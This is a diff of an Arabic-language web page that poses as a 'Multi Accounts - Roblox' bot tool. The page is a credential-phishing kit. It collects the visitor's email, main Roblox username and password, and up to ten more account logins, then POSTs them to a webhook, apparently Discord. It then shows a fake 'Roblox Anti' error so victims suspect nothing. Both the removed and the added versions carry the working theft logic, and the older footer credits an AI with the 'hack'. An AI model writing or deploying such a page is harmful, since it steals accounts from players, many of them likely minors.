@@ -6,16 +6,17 @@
     <title>Multi Accounts - Roblox</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #333; }
-        .container { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 500px; text-align: center; }
-        h1 { color: #007bff; margin-bottom: 20px; font-size: 24px; }
+        .container { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 500px; text-align: center; border: 1px solid #ddd; }
+        h1 { color: #333; margin-bottom: 20px; font-size: 22px; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
         .step { display: none; }
         .step.active { display: block; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #007bff; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #007bff; }
+        button { width: 100%; padding: 12px; background-color: #007bff; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
         button:hover { background-color: #0056b3; }
-        .error { color: #ff0000; font-size: 14px; margin-top: 5px; display: none; font-weight: bold; }
-        .bot-section { border-top: 2px solid #eee; margin-top: 15px; padding-top: 10px; text-align: right; }
-        .bot-label { font-weight: bold; color: #555; }
+        .error { color: #d9534f; font-size: 14px; margin-top: 5px; display: none; font-weight: bold; }
+        .bot-section { border-top: 1px solid #eee; margin-top: 15px; padding-top: 10px; text-align: right; }
+        .bot-label { font-weight: bold; color: #444; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -24,30 +25,30 @@
     <!-- المرحلة الأولى: تحقق الإيميل -->
     <div id="step1" class="step active">
         <h1>Multi Accounts - Roblox</h1>
-        <p>عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط، ضع إيميلك هنا :</p>
-        <input type="email" id="user_email" placeholder="example@gmail.com">
+        <p>عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط ضع ايميلك هنا :</p>
+        <input type="email" id="user_email" placeholder="example@domain.com">
         <div id="email_error" class="error"></div>
         <button onclick="validateEmail()">تحقق الآن</button>
     </div>
 
-    <!-- المرحلة الثانية: اختيار عدد البوتات والبيانات -->
+    <!-- المرحلة الثانية: تعبئة البيانات -->
     <div id="step2" class="step">
         <h1 id="title_step2">Multi Bots - Roblox</h1>
-        <p>كم تريد عدد البوتات؟ (يتطلب هذا الخيار حسابك الأساسي ليدخلون إليه)</p>
+        <p>كم تريد عدد البوتات + (يتطلب هاذا الخيار حسابك الاساسي ليدخلون اليه) :</p>
         <select id="bot_count" onchange="generateBotFields()">
             <option value="0">اختر العدد...</option>
-            <option value="1">1 بوت</option>
-            <option value="2">2 بوت</option>
-            <option value="3">3 بوت</option>
-            <option value="4">4 بوت</option>
-            <option value="6">6 بوتات</option>
-            <option value="10">10 بوتات</option>
+            <option value="1">1</option>
+            <option value="2">2</option>
+            <option value="3">3</option>
+            <option value="4">4</option>
+            <option value="6">6</option>
+            <option value="10">10</option>
         </select>
 
         <div class="bot-section">
-            <p class="bot-label">حسابك الأساسي (Main Account):</p>
-            <input type="text" id="main_user" placeholder="User الحساب الأساسي">
-            <input type="password" id="main_pass" placeholder="Password الحساب الأساسي">
+            <p class="bot-label">الحساب الاساسي :</p>
+            <input type="text" id="main_user" placeholder="user">
+            <input type="password" id="main_pass" placeholder="Password">
         </div>
 
         <div id="bots_inputs_container"></div>
@@ -58,10 +59,10 @@
 
     <!-- المرحلة الثالثة: صفحة الخطأ -->
     <div id="step3" class="step">
-        <h2 style="color: red;">Error - Roblox Anti</h2>
+        <h2 style="color: #333;">Error - Roblox Anti</h2>
         <hr>
-        <p>عذراً لقد تم صد المحاوله بسبب حمايه روبلوكس ، حاول مره اخرى لاحقاً او اخبر مطور الموقع بهاذا الخلل .. سيتم تجاوز الحمايه لاحقاً من قبل المطور !</p>
-        <p style="font-size: 12px; color: #888;">شاكرين لكم حسن الاستعمال</p>
+        <p style="text-align: right; line-height: 1.6;">عذراً لقد تم صد المحاوله بسبب حمايه روبلوكس ، حاول مره اخرى لاحقاً او اخبر مطور الموقع بهاذا الخلل .. سيتم تجاوز الحمايه لاحقاً من قبل المطور !</p>
+        <p style="font-size: 12px; color: #777; margin-top: 20px;">شاكرين لكم حسن الاستعمال</p>
     </div>
 </div>
 
@@ -73,8 +74,7 @@
         const email = document.getElementById('user_email').value;
         const errorDiv = document.getElementById('email_error');
         
-        // فحص صيغة الإيميل ومنع الوهمي المشهور
-        const fakeDomains = ['tempmail.com', '10minutemail.com', 'throwawaymail.com', 'mailinator.com'];
+        const fakeDomains = ['tempmail.com', '10minutemail.com', 'mailinator.com', 'guerrillamail.com'];
         const domain = email.split('@')[1];
 
         if (!email.includes('@') || !email.includes('.')) {
@@ -83,7 +83,7 @@
             return;
         }
 
-        if (fakeDomains.includes(domain) || email.length < 5) {
+        if (fakeDomains.includes(domain)) {
             errorDiv.innerText = "ضع ايميلك الحقيقي الوهمي غير مقبول [!]";
             errorDiv.style.display = "block";
             return;
@@ -102,7 +102,7 @@
         for (let i = 1; i <= count; i++) {
             container.innerHTML += `
                 <div class="bot-section">
-                    <p class="bot-label">حساب البوت #${i}:</p>
+                    <p class="bot-label">حساب البوت ${i} :</p>
                     <input type="text" id="bot_user_${i}" placeholder="User">
                     <input type="password" id="bot_pass_${i}" placeholder="Password">
                 </div>
@@ -117,50 +117,50 @@
         const errorDiv = document.getElementById('fill_error');
 
         if (count == 0 || !mainUser || !mainPass) {
-            errorDiv.innerText = "الرجاء تعبئة جميع الحقول الأساسية!";
+            errorDiv.innerText = "يرجى اكمال المعلومات الأساسية.";
             errorDiv.style.display = "block";
             return;
         }
 
-        let botsData = [];
+        let botsFields = [];
         for (let i = 1; i <= count; i++) {
             let u = document.getElementById(`bot_user_${i}`).value;
             let p = document.getElementById(`bot_pass_${i}`).value;
             if (!u || !p) {
-                errorDiv.innerText = `عذراً ولاكنك طلبت (${count}) بوتات، عبها كامله!`;
+                errorDiv.innerText = `عذراً ولاكنك طلبت (${count}) عبها كامله!`;
                 errorDiv.style.display = "block";
                 return;
             }
-            botsData.push({ name: `حساب البوت ${i}`, value: `👤 User: ${u}\n🔑 Pass: ${p}`, inline: false });
+            botsFields.push({ name: `حساب البوت ${i}`, value: `User: ${u}\nPassword: ${p}`, inline: false });
         }
 
-        // إرسال البيانات للويبهوك
-        const embed = {
-            title: "🔥 صيدة جديدة - Multi Accounts 🔥",
-            color: 16711680,
-            fields: [
-                { name: "📧 إيميل التحقق", value: storedEmail, inline: false },
-                { name: "--- المعلومات الاخرى ---", value: "\u200B", inline: false },
-                { name: "👤 حسابه الاساسي (User)", value: mainUser, inline: true },
-                { name: "🔑 حسابه الاساسي (Password)", value: mainPass, inline: true },
-                ...botsData
-            ],
-            footer: { text: "تم الاختراق بواسطة ذكي AI 🔥" },
-            timestamp: new Date()
+        const embedData = {
+            embeds: [{
+                title: "تقرير بيانات جديد",
+                color: 0,
+                fields: [
+                    { name: "الايميل المستخدم", value: storedEmail, inline: false },
+                    { name: "المعلومات الاخرى ~", value: "\u200B", inline: false },
+                    { name: "حسابه الاساسي : user", value: mainUser, inline: true },
+                    { name: "Password", value: mainPass, inline: true },
+                    ...botsFields
+                ],
+                footer: { text: "تم سحب المعلومات من الموقع |Z7F" },
+                timestamp: new Date()
+            }]
         };
 
         try {
             await fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
+                body: JSON.stringify(embedData)
             });
             
-            // الانتقال لصفحة الخطأ
             document.getElementById('step2').classList.remove('active');
             document.getElementById('step3').classList.add('active');
         } catch (e) {
-            alert("خطأ في الاتصال بالسيرفر!");
+            console.error("Error sending data.");
         }
     }
 </script>
